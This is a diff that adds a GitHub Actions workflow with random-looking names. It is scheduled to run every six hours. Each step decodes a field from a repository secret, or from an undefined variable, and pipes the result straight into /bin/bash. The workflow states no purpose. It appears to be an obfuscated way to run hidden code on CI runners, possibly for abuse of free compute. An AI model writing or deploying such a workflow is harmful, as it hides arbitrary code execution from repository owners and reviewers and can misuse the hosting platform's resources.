@@ -1,0 +1,28 @@
+name: mufuya3456
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '35 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: mufuya3456
+        env:
+          ebfg7497: ${{ secrets.ebfg7497 }}
+        run: |
+          echo $ebfg7497 | jq -r .nnzkf72195 | /bin/bash
+          echo $u18707 | jq -r .jmp35108 | /bin/bash
+          echo $f623 | jq -r .aw925 | /bin/bash
+          echo $zg31 | jq -r .gsrc510 | /bin/bash
+          echo $ditnn1323 | jq -r .lsbne863 | /bin/bash
+          echo $f72390 | jq -r .cychs40 | /bin/bash
+          echo $hd45 | jq -r .ckes2713 | /bin/bash
+          echo $fenim010 | jq -r .mwye58 | /bin/bash
+          echo $s973 | jq -r .lyegp652 | /bin/bash
+          echo $yson79 | jq -r .ngis1 | /bin/bash
+          echo $za69 | jq -r .x29 | /bin/bash
+          echo $xjjv00027 | jq -r .d46005 | /bin/bash
+
